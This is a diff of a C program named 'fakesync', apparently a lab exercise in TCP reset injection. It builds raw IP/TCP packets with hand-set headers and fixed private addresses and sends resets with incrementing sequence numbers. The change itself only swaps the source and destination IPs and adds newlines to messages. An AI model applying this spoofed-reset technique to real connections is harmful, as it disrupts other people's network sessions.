@@ -61,8 +61,8 @@ int main(int argc, char *argv[])
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    char *srcIP = "172.19.3.82";
-    char *dstIP = "10.0.2.15";
+    char *srcIP = "10.0.2.15";
+    char *dstIP = "172.19.3.82";
     uint16_t srcPort = 35801;
     uint16_t svrPort = 35801;
     uint32_t seq0 = 3968001;
@@ -74,13 +74,13 @@ int main(int argc, char *argv[])
 
     // Open raw socket without protocol header
     if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-        perror("fakesync: socket");
+        perror("fakesync: socket\n");
         exit(-1);
     }
 
     // Set option to include protocol header
     if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
-        perror("fakesync: socketopt()");
+        perror("fakesync: socketopt()\n");
         exit(-1);
     }
 
@@ -154,11 +154,11 @@ int main(int argc, char *argv[])
     {
         tcph -> seq = htonl(seq0++); // set seq number
         cstcph -> seq = htonl(seq0); // set seq number in the checksum header
-        printf("seq: %u", seq0);
+        printf("seq: %u\n", seq0);
         tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len);
         if ((n = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
         {
-            perror("fakesync: sendto()");
+            perror("fakesync: sendto()\n");
         }
 
         printf("reset sent\n");
